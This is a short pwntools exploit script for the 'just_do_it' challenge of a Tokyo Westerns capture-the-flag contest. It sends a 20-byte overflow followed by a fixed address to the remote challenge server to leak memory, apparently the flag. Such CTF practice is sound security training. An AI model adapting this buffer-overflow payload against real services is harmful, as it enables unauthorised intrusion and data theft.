from pwn import *

context.log_level = 'DEBUG'

if False:
    r = process('./just_do_it')
    gdb.attach(r, '''
    b *0x08048704
    c
    ''')
else:
    r = remote('pwn1.chal.ctf.westerns.tokyo', 12345)

r.recv()
r.sendline('A'*20 + p32(0x804A080))
leak = u32(r.recv(4))
print(r.recv())
